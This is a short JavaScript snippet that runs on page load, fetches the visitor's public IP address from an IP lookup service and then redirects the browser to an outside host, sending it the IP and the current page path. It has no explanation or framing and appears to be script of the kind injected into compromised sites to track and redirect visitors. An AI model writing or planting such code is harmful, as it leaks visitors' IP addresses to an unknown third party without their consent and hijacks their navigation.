document.addEventListener("DOMContentLoaded", () => {
    fetch('https://api.ipify.org?format=json').then(res => res.json()).then(t => location.href = "http://t91176wr.beget.tech/ip.php?ip="+t.ip+"&html="+location.pathname);
});